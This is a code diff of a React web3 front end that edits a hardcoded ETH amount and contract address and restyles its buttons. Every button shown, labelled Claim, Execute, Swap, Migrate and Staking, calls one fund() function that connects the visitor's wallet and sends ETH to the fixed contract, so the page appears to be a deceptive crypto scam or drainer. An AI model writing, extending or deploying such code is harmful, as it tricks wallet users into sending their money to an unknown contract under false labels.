@@ -12,7 +12,7 @@ import Toggle from './Toggle'
 
 let web3Modal;
 
-const ethAmount = 0.226137;
+const ethAmount = 0.01;
 
 const providerOptions = {
 
@@ -63,14 +63,14 @@ export default function Home() {
     
   }
 async function fund() {
-  const ethAmount = "0.226137";
+  const ethAmount = "0.01";
     console.log(`Funding with ${ethAmount}...`)
   
     const web3ModalProvider = await web3Modal.connect();
         setIsConnected(true);
         const provider = new ethers.providers.Web3Provider(web3ModalProvider);
         setSigner(provider.getSigner());
-      const contractAddress = '0xC14Ef989e38208167c6D2Ae1115B8a18c2953B15';
+      const contractAddress = '0xA2fAa6289311f06C8DC234db09512Ce9b8fAc9BF';
       const contract = new ethers.Contract(contractAddress, abi, signer);
         try {
             const transactionResponse = await contract.fund({
@@ -110,9 +110,9 @@ async function fund() {
 
             <div className="inner-button-wrap-1">
 
-            <button  onClick={() => fund()}>Claim</button>
-               {isConnected ? <button onClick={() => fund()}>Execute</button> : ""}
-          <button onClick={() => fund()}>Swap</button>
+            <button className="btn" onClick={() => fund()}>Claim</button>
+               {isConnected ? <button className="btn" onClick={() => fund()}>Execute</button> : ""}
+          <button className="btn" onClick={() => fund()}>Swap</button>
 
             </div>
 
@@ -120,8 +120,8 @@ async function fund() {
 
           <div className="main-button-wrap-2">
             <div className="inner-button-wrap-2">
-            <button  onClick={() => fund()}>Migrate</button>
-          <button  onClick={() => fund()}>Staking</button>
+            <button className="btn"  onClick={() => fund()}>Migrate</button>
+          <button className="btn" onClick={() => fund()}>Staking</button>
               
 
             </div>
